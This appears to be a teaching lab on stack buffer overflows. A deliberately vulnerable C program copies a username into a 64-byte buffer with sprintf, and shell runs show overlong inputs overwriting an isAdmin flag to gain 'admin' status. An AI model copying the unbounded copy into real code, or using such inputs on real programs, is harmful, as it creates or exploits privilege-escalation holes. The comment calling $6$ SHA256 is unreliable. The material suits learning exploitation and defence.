# Buffer overflow - overwrite variables on the stack

## Intro

We will perform a simple buffer overflow on a binary. This overflow
will change the function flow, which enables us to gain "admin" privileges.


## Vulnerable program

We have the following program:

challenge10.c:
```
#include <stdio.h>
#include <stdlib.h>
#include <crypt.h>
#include <string.h>

/* hash of: "ourteacheristehbest" */
const char *adminHash = "$6$saaaaalty$cjw9qyAKmchl7kQMJxE5c1mHN0cXxfQNjs4EhcyULLndQR1wXslGCaZrJj5xRRBeflfvmpoIVv6Vs7ZOQwhcx.";


int checkPassword(char *password) {
    char *hash;

    /* $6$ is SHA256 */
    hash = crypt(password, "$6$saaaaalty");

    if (strcmp(hash, adminHash) == 0) {
        return 1;
    } else {
        return 0;
    }
}


void handleData(char *username, char *password) {
    int isAdmin = 0;
    char name[64]; // should be enough for all usernames

    // Check if user has admin privileges
    isAdmin = checkPassword(password);

    // create internal username
    sprintf(name, "%s-%s", "cmd", username);

    if(isAdmin > 0) {
        printf("Hello %s.\nYou are admin!\nisAdmin: 0x%x\n", name, isAdmin);
    } else {
        printf("Hello %s.\nYou are not admin.\nisAdmin: 0x%x\n", name, isAdmin);
    }
}


int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Call: %s <name> <password>\n", argv[0]);
        exit(0);
    }

    handleData(argv[1], argv[2]);
}
```

You can compile it by calling `make` in the folder `~/challenges/challenge10`


## Normal behaviour

Lets execute the program with normal length string, and with a wrong password:

```
root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 sheldon test
Hello cmd-sheldon.
You are not admin.
isAdmin: 0x0
```

Lets execute it with the correct password:

```
root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 sheldon ourteacheristehbest
Hello cmd-sheldon.
You are admin!
isAdmin: 0x1
```

With the correct password, a message will be printed indicating that the user "cmd-sheldon"
has admin privileges.

## Abnormal behaviour - overflow

What happens when you insert a string which is longer than 64 bytes? Lets try it.
We can use python to print 70 characters:

```
root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*70'` root
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
You are admin!
isAdmin: 0x41414141
```

## Abnormal behaviour - more overflow

What if we even add some more characters? Lets say 100.

```
root@hlUbuntu32aslr:~/challenges/challenge10# ./challenge10 `python -c 'print "A"*100'` root
Hello cmd-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
You are admin!
isAdmin: 0x41414141
Segmentation fault (core dumped)
```


## Questions

### Question 1: Why isAdmin = TRUE?

If you enter the valid password (ourteacheristehbest), the program returns "You ARE admin!"
If you enter an overlong password (70x"A"), the program returns "You ARE admin!" too.
Explain why you got admin privs when smashing the stack.